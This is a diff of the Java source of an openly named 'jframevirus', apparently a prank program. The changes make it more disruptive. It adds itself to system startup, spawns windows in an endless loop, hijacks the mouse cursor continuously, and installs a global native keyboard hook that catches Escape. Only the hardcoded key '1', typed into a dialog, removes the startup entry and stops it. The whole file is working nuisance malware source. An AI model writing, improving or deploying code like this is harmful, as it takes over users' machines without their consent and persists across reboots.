@@ -1,11 +1,15 @@
 package com.joo.jframevirus;
 
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import com.joo.jframevirus.autostart.AutoStartManager;
-import com.joo.jframevirus.keydialog.FailureException;
 import com.joo.jframevirus.keydialog.KeyDialog;
 
 import java.awt.*;
-import java.awt.event.KeyEvent;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 public class MainController {
     private Dimension screenSize;
@@ -13,14 +17,15 @@ public class MainController {
     private Thread mouseThread,
             jframeThread;
     private KeyDialog keyDialog;
+    private volatile boolean paused;
 
     public static final String KEY = "1";
+    public static final Logger LOGGER = Logger.getLogger(MainController.class.getName());
 
     public MainController() {
         init();
         AutoStartManager.getInstance().addVirusToStartup();
-        startMouseMoving();
-        startRandomFrame();
+        startThreads();
         setupWindowListener();
     }
 
@@ -32,7 +37,8 @@ public class MainController {
             e.printStackTrace();
         }
         initializeThreads();
-        keyDialog = new KeyDialog();
+        keyDialog = new KeyDialog(this);
+        paused = false;
     }
 
     private void initializeThreads() {
@@ -43,12 +49,10 @@ public class MainController {
     private void initializeJFrameThreads() {
         jframeThread = new Thread(() -> {
             // TODO: 5/16/22 Make this a while loop
-            for (int i = 0; i < 100; i++) {
-                new RandomFrame(screenSize);
-                try {
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
+            while (true) {
+                LOGGER.log(Level.INFO, "paused = " + paused);
+                if (!paused) {
+                    new RandomFrame(screenSize);
                 }
             }
         });
@@ -57,58 +61,61 @@ public class MainController {
     private void initializeMouseThread() {
         mouseThread = new Thread(() -> {
             // TODO: 5/15/22 Make this a while loop
-            for (byte i = 0; i < 10; i++) {
-                robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
-                        (int) (Math.random() * screenSize.getHeight()));
+            while (true) {
+                if (!paused) {
+                    robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
+                            (int) (Math.random() * screenSize.getHeight()));
+                }
             }
         });
     }
 
     // TODO: 5/15/22 Tst this in windows
     private void setupWindowListener() {
-        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
-            if (e.getID() == KeyEvent.KEY_PRESSED) {
-                if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException e) {
+            e.printStackTrace();
+        }
+        GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
+            @Override
+            public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
+                if (nativeEvent.getKeyCode() == NativeKeyEvent.VC_ESCAPE && !paused) {
+                    LOGGER.log(Level.INFO, "Escape pressed");
                     // Pause the threads
-                    pauseThreads();
+                    pause();
+                    // Move the mouse to the center of the screen
+                    robot.mouseMove(screenSize.width / 2, screenSize.height / 2);
                     // Show a dialog to get the key
-                    virusStopKey();
+                    keyDialog.showDialog();
                 }
             }
-            return false;
         });
     }
 
-    private void pauseThreads() {
-        try {
-            mouseThread.join();
-            jframeThread.join();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
+    private void pause() {
+        paused = true;
     }
 
-    public void startMouseMoving() {
+    private void resume() {
+        paused = false;
+    }
+
+
+    private void startThreads() {
         mouseThread.start();
-    }
-
-    public void startRandomFrame() {
         jframeThread.start();
     }
 
-    public void virusStopKey() {
-        try {
-            keyDialog.showDialog();
-            // If continue then exit
+    public void onKeyDialogAction() {
+        if (keyDialog.isAccepted()) {
+            LOGGER.log(Level.FINE, "Remove virus from auto start programs");
+            AutoStartManager.getInstance().removeVirusFromStartup();
+            LOGGER.log(Level.FINE, "Exit...");
             System.exit(0);
-        } catch (FailureException e) {
-            resumeThreads();
-        }
-    }
-
-    private void resumeThreads() {
-        synchronized(MainController.this) {
-            MainController.this.notifyAll();
+        } else {
+            LOGGER.log(Level.WARNING, "The key is not correct");
+            resume();
         }
     }
 }
